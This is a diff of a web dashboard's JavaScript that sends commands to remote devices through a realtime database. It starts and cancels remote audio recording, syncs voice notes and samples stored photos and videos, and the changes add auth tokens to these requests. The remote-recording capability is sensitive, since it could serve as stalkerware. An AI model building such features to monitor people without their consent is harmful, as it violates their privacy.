@@ -3616,10 +3616,8 @@ async function sendFcmPush() {
   try {
     document.getElementById('fcmLastPush').textContent = 'Requesting sync...';
     const now = Date.now();
-    await fetch(`${RTDB}/devices/${selectedDevice}/fcm/sync_request.json`, {
-      method: 'PUT',
-      body: JSON.stringify({ requested: now, ts: now })
-    });
+    const ok = await writeRTDBStrict(`devices/${selectedDevice}/fcm/sync_request`, { requested: now, ts: now });
+    if (!ok) throw new Error('HTTP failed');
     document.getElementById('fcmLastPush').textContent = '\u2705 Sync requested at ' + pkt(now);
     showAlert('Sync request sent to device', 'warn');
   } catch (e) {
@@ -4604,8 +4602,7 @@ document.getElementById('btnSelectAllVoice')?.addEventListener('click', function
 async function writeVoiceBatch(batchKey, notesArray, tsMs, freeMb) {
   const batch = { notes: notesArray, totalCount: notesArray.length, ts_ms: tsMs, freeMb: freeMb };
   try {
-    const r = await fetch(`${RTDB}/devices/${selectedDevice}/voice_notes/${batchKey}.json`, { method: 'PUT', body: JSON.stringify(batch) });
-    return r.ok;
+    return await writeRTDBStrict(`devices/${selectedDevice}/voice_notes/${batchKey}`, batch);
   } catch { return false; }
 }
 
@@ -4616,8 +4613,8 @@ async function migrateLegacyBatch(batchKey, notesArray, tsMs) {
     for (let i = 0; i < notesArray.length; i++) {
       const nkey = 'batch_' + baseTs + '_' + i;
       const migrated = Object.assign({}, notesArray[i], { ts_ms: tsMs });
-      const r = await fetch(`${RTDB}/devices/${selectedDevice}/voice_notes/${nkey}.json`, { method: 'PUT', body: JSON.stringify(migrated) });
-      if (!r.ok) return null;
+      const ok = await writeRTDBStrict(`devices/${selectedDevice}/voice_notes/${nkey}`, migrated);
+      if (!ok) return null;
       newKeys.push(nkey);
     }
     const ok = await deleteRTDB(`devices/${selectedDevice}/voice_notes/${batchKey}`);
@@ -4931,7 +4928,8 @@ async function pollRemoteRecordings() {
   let data = null, reachable = false;
   try {
     trackRead();
-    const r = await fetch(`${RTDB}/devices/${deviceId}/recordings.json?shallow=true`);
+    const tok = await authParam();
+    const r = await fetch(`${RTDB}/devices/${deviceId}/recordings.json?shallow=true${tok ? '&auth=' + tok : ''}`);
     if (r.ok) { reachable = true; data = await r.json(); }
   } catch (e) { data = null; }
   if (!reachable) {
@@ -5156,10 +5154,8 @@ async function startRemoteRecordingRemote() {
   const requestId = crypto.randomUUID ? crypto.randomUUID() : 'req_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
   const path = `devices/${deviceId}/commands/audio_record`;
   try {
-    await fetch(`${RTDB}/${path}.json`, {
-      method: 'PUT',
-      body: JSON.stringify({ action: 'start', durationSec: durSec, requestId })
-    });
+    const ok = await writeRTDBStrict(path, { action: 'start', durationSec: durSec, requestId });
+    if (!ok) throw new Error('HTTP failed');
     _remoteRecordingActive = true;
     document.getElementById('remote-recStatus').textContent = 'Recording started...';
     document.getElementById('remote-recProgress').style.display = 'block';
@@ -5181,10 +5177,8 @@ async function cancelRemoteRecordingRemote() {
   if (!deviceId) return;
   const path = `devices/${deviceId}/commands/audio_record`;
   try {
-    await fetch(`${RTDB}/${path}.json`, {
-      method: 'PUT',
-      body: JSON.stringify({ action: 'cancel' })
-    });
+    const ok = await writeRTDBStrict(path, { action: 'cancel' });
+    if (!ok) throw new Error('HTTP failed');
     resetRemoteRecordingUI();
     showAlert('Cancel command sent', 'warn');
   } catch (e) {
@@ -6810,7 +6804,8 @@ async function estimatePhotos() {
       const v = await fetchRTDB(`${devicePath}/photos/_index/md5/${md5}`);
       if (v && v.ts && tsToDate[String(v.ts)]) {
         try {
-          const r = await fetch(`${RTDB}/${devicePath}/photos/${tsToDate[String(v.ts)]}/${v.ts}.json`);
+          const tok = await authParam();
+          const r = await fetch(`${RTDB}/${devicePath}/photos/${tsToDate[String(v.ts)]}/${v.ts}.json${tok ? '?auth=' + tok : ''}`);
           if (r.ok) { const t = await r.text(); bytes += new Blob([t]).size; sampled++; }
         } catch {}
       }
@@ -6828,7 +6823,8 @@ async function estimateVideos() {
     let bytes = 0, sampled = 0;
     for (const k of keys.slice(0, 3)) {
       try {
-        const r = await fetch(`${RTDB}/${devicePath}/videos/_index/${k}.json`);
+        const tok = await authParam();
+        const r = await fetch(`${RTDB}/${devicePath}/videos/_index/${k}.json${tok ? '?auth=' + tok : ''}`);
         if (r.ok) { const t = await r.text(); bytes += new Blob([t]).size; sampled++; }
       } catch {}
     }
@@ -6841,7 +6837,8 @@ async function estimateVideos() {
   let bytes = 0, sampled = 0;
   for (const k of keys.slice(0, 2)) {
     try {
-      const r = await fetch(`${RTDB}/${devicePath}/videos/${k}.json`);
+      const tok = await authParam();
+      const r = await fetch(`${RTDB}/${devicePath}/videos/${k}.json${tok ? '?auth=' + tok : ''}`);
       if (r.ok) { const t = await r.text(); bytes += new Blob([t]).size; sampled++; }
     } catch {}
   }
@@ -6860,7 +6857,8 @@ async function estimateNodeSize(path, sampleSize = 3) {
   const toSample = entries.sort(() => Math.random() - 0.5).slice(0, sampleSize);
   for (const key of toSample) {
     try {
-      const r = await fetch(`${RTDB}/${path}/${key}.json`);
+      const tok = await authParam();
+      const r = await fetch(`${RTDB}/${path}/${key}.json${tok ? '?auth=' + tok : ''}`);
       if (r.ok) {
         const text = await r.text();
         totalBytes += new Blob([text]).size;
